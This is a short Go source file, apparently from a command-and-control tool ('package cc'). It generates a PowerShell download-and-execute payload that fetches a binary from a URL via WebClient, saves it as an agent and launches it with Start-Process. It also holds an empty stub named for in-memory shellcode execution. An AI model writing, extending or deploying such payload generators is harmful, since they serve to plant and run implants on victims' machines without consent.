package cc

import "fmt"

func powershell_download_exec(agent_bin_path, url string) (ret []byte) {
	cmd := `$url = '%s'
$agent_bin_path = '%s'
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $agent_bin_path)
Start-Process -FilePath $agent_bin_path`
	return []byte(fmt.Sprintf(cmd, url, agent_bin_path))
}

func powershell_shellcode_in_mem() (ret []byte) {
	return
}
